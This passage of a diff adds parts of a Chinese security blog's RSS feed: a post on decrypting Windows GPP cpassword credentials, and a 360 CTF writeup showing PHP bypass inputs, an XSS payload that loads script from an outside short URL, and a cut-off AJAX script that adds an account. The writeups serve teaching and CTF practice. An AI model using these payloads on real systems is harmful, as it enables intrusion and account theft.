+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Groups&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;User&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changed=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2015-08-14 17:21:15&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{149655A8-CC7E-4A49-8A3C-403D1615AF63}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;Properties&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;U&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;newName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fullName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;description=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cpassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aUcBkzsNN7W1N3eM/JmKvw&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changeLogon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;noChange=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;neverExpires=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;acctDisabled=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;/User&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Groups&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这里面存储着添加用户的账号密码。其中密码通过AES加密了，但是微软把解密的私钥写在了文档里面导致可以解密密码。
+除了这个地方存在账号密码，以下路径可能也存在&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Services\Services.xml 
+
+ScheduledTasks\ScheduledTasks.xml 
+
+Printers\Printers.xml
+
+Drives\Drives.xml
+
+DataSources\DataSources.xml
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;拿到加密密码之后，我们使用脚本解密&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2062133923.png&quot; alt=&quot;2062133923&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;或者使用powershell脚本&lt;/p&gt;
+
+&lt;p&gt;脚本见附件&lt;a href=&quot;http://bl4ck.in/usr/uploads/2015/08/2250856726.zip&quot;&gt;gpp-exploit.zip&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;防御&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;可以直接设置xml的读取权限，从而防止恶意的读取&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 14 Aug 2015 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2015/08/14/windows2008-GPP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2015/08/14/windows2008-GPP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.html</guid>
+        
+        <category>penetration</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>第三届-360信息安全大赛 writeup</title>
+        <description>&lt;p&gt;&lt;strong&gt;web10&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;首先保存那个图片，然后用winhex在尾部发现&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+Where is the key?&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ZW1lbS4uLiAvY3RmXzM2MF9mbGFn&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;然后base64_decode之后，为emem… /ctf_360_flag 后面群里提示苹果电脑，然后访问&lt;/p&gt;
+
+&lt;p&gt;http://isg.campus.360.cn/web1/ctf_360_flag/.DS_Store&lt;/p&gt;
+
+&lt;p&gt;成功拿到flag&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;web20&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;首先拿到泄露的源码&lt;/p&gt;
+
+&lt;p&gt;http://isg.campus.360.cn/web2/check.php.swp&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;sd&quot;&gt;/***
+
+此处为提示
+
+$code=0000000000;
+
+admin code 0
+
+user code  1
+
+test code 2
+
+***/&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;len_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'code'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+ 
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'email'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'code'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; 
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;email='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'email'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' ANDcode='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'code'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&quot;)) 
+
+        die('&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;');
+
+    $_SESSION['&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;']= $_GET['&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; 
+
+        &lt;span class=&quot;o&quot;&gt;..........&lt;/span&gt;
+
+&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+
+?&amp;gt;
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;然后找到了p神这篇文章&lt;/p&gt;
+
+&lt;p&gt;https://www.leavesongs.com/PENETRATION/findpwd-funny-logic-vul.html&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-986860641.png&quot; alt=&quot;986860641&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后我们构造code为000000000x&lt;/p&gt;
+
+&lt;p&gt;code的长度要为十因为源码里面有len_check($_GET[‘code’],10)，0是代表admin.然后成功拿到flag。&lt;/p&gt;
+
+&lt;p&gt;没发现这篇文章之前还写了个脚本在跑。就是先获取code，然后提交。跑了一下午然后并没有什么卵用。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;web40&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;http://isg.campus.360.cn/web3/&lt;/p&gt;
+
+&lt;p&gt;这个题也是给了一个图片&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3175041946.jpg&quot; alt=&quot;3175041946&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看到文件的结尾&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3365764845.png&quot; alt=&quot;3365764845&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+--.  ..  ..-.  ---..  ----.  .-  ;
+
+&amp;lt;..--..  .--.  ....  .--.   $.-   = &quot;-----  .-.-.-  .----  &quot;;$-...   = $_--.  .  -  [.----.  -...  .----.  ];..  ..-.  ($-...   -.-.--  = .----.  .----.  ){    ..  ..-.   (..  ...  _.-  .-.  .-.  .-  -.--  ($-...  )){        .  -.-.  ....  ---   &quot;-.  ---   -.-  .  -.--  -.-.--  &quot;;        .  -..-  ..  -  ;    }.  .-..  ...  .  ..  ..-.  (-.-.--  ..  ...  _-.  ..-  --  .  .-.  ..  -.-.  ($-...  )){       $-.-.   = (..  -.  -  )(($.-   + $-...  ) * .----  -----  );        ..  ..-.   ($-.-.   == &quot;---..  &quot; &amp;amp;&amp;amp; $-...  [.----  -----  ] == ..-.  .-  .-..  ...  .  ){            .  -.-.  ....  ---   &quot;..-.  .-..  .-  --.  &quot;;        }.  .-..  ...  .  {            .  -.-.  ....  ---   &quot;-.  ---   -.-  .  -.--  -.-.--  &quot;;            .  -..-  ..  -  ;        }    }.  .-..  ...  .  {        .  -.-.  ....  ---   &quot;-.  ---   -.-  .  -.--  -.-.--  &quot;;    }}.  .-..  ...  .  {    .  -.-.  ....  ---   &quot;-.  ---   -.-  .  -.--  -.-.--  &quot;;}..--..  &amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;可以看到是莫尔斯编码加上了php的一些语法，把莫尔斯编码还原之后就可以得到php代码&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+GIF89a;
+
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+	&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+	&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'b'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;is_array&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+		&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+			&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nokey!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+			&lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;is_numeric&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+		&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+			&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;8&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+			&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+				&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;   &lt;span class=&quot;s2&quot;&gt;&quot;flag &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+			&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; 
+
+			&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+				&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;nokey &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+				&lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;nokey &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
+
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;no  &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;就是要想办法绕过 对is_array和is_numeric的检查，进入flag的分支里&lt;/p&gt;
+
+&lt;p&gt;首先是绕过is_array,可以传一个数字进去，但是数字的话又会过不了is_numeric&lt;/p&gt;
+
+&lt;p&gt;这里用到的一个trick是 0.7a，在数字之后加上a之类的，变成str的类型，但是经过(int)类型转换之后又会变成0.7&lt;/p&gt;
+
+&lt;p&gt;尝试传入b=0.7a，可以本地搭建起来调试，var_dump($c);把$c的结果打印出来发现是7&lt;/p&gt;
+
+&lt;p&gt;尝试传入b=0.8a，$c这个时候是9，这个是php的浮点数的精度的问题&lt;/p&gt;
+
+&lt;p&gt;传入b=0.75a就可以获得flag了&lt;/p&gt;
+
+&lt;p&gt;http://isg.campus.360.cn/web3/?b=0.75a&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;web160&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;这题其实是一个xss的题目，因为页面描述说管理员会记录你的一切操作。先打了一发cookie，然后修改cookie。发现直接跳到首页，并没有什么卵用。后面用ajax偷到了页面的源码。通过分析源码发现，有一个添加用户的地方。首先xss的payload&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/textarea&amp;gt;&lt;/span&gt;'&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://t.cn/R2CvZvl&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3409089775.png&quot; alt=&quot;3409089775&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后我们构造一个ajax添加一个账号。&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+
+
+&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;overrideMimeType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+
+
+&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;overrideMimeType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'text/xml'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+
+
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;versions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Microsoft.XMLHTTP'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'MSXML.XMLHTTP'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Microsoft.XMLHTTP'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Msxml2.XMLHTTP.7.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Msxml2.XMLHTTP.6.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Msxml2.XMLHTTP.5.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Msxml2.XMLHTTP.4.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'MSXML2.XMLHTTP.3.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'MSXML2.XMLHTTP'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;versions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+
+
+&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+
+
+&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;versions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
+
+
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+
+&lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+
+
+
+
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/web5/adduser&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+
+
+
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name=tomato&amp;amp;pass=123456&amp;amp;submit=ok'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+
+
